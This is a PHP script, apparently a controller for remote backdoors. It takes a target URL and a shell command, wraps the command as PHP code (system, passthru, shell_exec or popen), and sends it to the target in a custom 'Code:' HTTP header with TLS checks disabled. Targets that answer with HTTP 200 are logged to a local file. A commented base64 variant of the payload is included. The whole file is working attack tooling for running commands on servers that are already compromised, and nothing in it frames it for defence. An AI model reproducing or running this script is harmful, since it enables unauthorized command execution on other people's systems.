<?php

define("FILESAVE", "__saveurl.xxx");
$url = isset($_POST['url'])?$_POST['url']:false;
$cmd = isset($_POST['cmd'])?$_POST['cmd']:false;
$executor = isset($_POST['executor'])?$_POST['executor']:false;

if(!$url){$outu = "[x] ERR : No URL\n";}else{$outu =false;}
if(!$cmd){$outc = "[x] ERR : No COMMAND\n";}else{$outc =false;}

$out = $outu . $outc;
$isChecked = false;

switch($executor){
	case "s":
		$ex = "system";
		break;
	case "p":
		$ex = "passthru";
		break;
	case "se":
		$ex = "shell_exec";
		break;
	case "po":
		$ex = "po";
		break;
}

if($ex == "po"){
	$pp = '$f=@popen("'.$cmd.'","r");$out="";while(!@feof($f)){$out .= @fread($f,1024);}pclose($f);echo $out;';
	//$pp = 'JyRmPUBwb3BlbigiJy4kY21kLiciLCJyIik7JG91dD0iIjt3aGlsZSghQGZlb2YoJGYpKXskb3V0IC49IEBmcmVhZCgkZiwxMDI0KTt9cGNsb3NlKCRmKTtlY2hvICRvdXQ7Jw==';
	//$pp = base64_encode($pp);
	$ocmd = $pp;
}else{
	$ocmd = $ex."('".$cmd."');";
}

$parse_url = @parse_url($url);
$url_query = isset($parse_url['query'])?$parse_url['query']:false;
if($url_query){$url_query = "?".urlencode($url_query);}
$url = $parse_url['scheme']."://".$parse_url['host'].$parse_url['path'].$url_query;
$url_port = isset($parse_url['port'])?$parse_url['port']:80;
if($parse_url['scheme'] == 'https'){$url_port = 443;}

/*
Array
(
    [scheme] => http
    [host] => bar.google.com
	[port] => 81
    [path] => /sample/js/index.php
    [query] => Test=1
)
*/

$options = array(
    CURLOPT_HTTPHEADER  => array("Content-Type: text/html","Code: $ocmd"),
    CURLOPT_RETURNTRANSFER  => true ,
	CURLOPT_FRESH_CONNECT => true,
	CURLOPT_SSL_VERIFYPEER => false,
	CURLOPT_SSL_VERIFYHOST => false,
	CURLOPT_PORT => $url_port,
	CURLOPT_TIMEOUT => 5,
);

echo "\n\n".'---------- ['.$url.' @port '.$url_port.'] ----------'."\n\n";

if($url && $cmd){
	$out = curl_http_request($url, $options);
}

if($out){
	$res = $out;
}else{
	$res = false;
}

function tulisfile($textfile,$temp){
    if(file_exists($textfile)){
        $fp = fopen ($textfile, "aw");
        if($temp){
            $strtosave = $temp."\n";
            fwrite ($fp, $strtosave);
        }
        fclose($fp);
    }else{
        $fp = fopen ($textfile, "w");
        if($temp){
            $strtosave = $temp."\n";
            $strtosave = $temp."\n";
            fwrite ($fp, $strtosave);
        }
        fclose($fp);
    }
} 

function check_exist($url){
	$parse = parse_url($url);
	$dom = $parse['host'];
	$path = $parse['path'];
	if(file_exists(FILESAVE)){
		foreach(file(FILESAVE) as $line) {
		   if(strstr($line,$dom)){
			   if(strstr($line,$path)){
				   //print_r(array($line,$path));
				   return true;
			   }
		   }
		}
		return false;
	}else{
		return false;
	}
}

function curl_http_request ($url, $options){
	global $cmd;
    $handle = curl_init($url);
    curl_setopt_array($handle, $options);
    //ob_start();
    $buffer = curl_exec($handle);
	$http_code = curl_getinfo($handle, CURLINFO_HTTP_CODE);
    //ob_end_clean();
    curl_close($handle);
	if($buffer && $http_code == '200'){
		if(!check_exist($url)){
			tulisfile(FILESAVE,$url);
		}
	}
	$buffer = $buffer. "\n".'--------------------------- process ['.$cmd.'] complete --------------------------- ';
    return $buffer;
} 

die($res);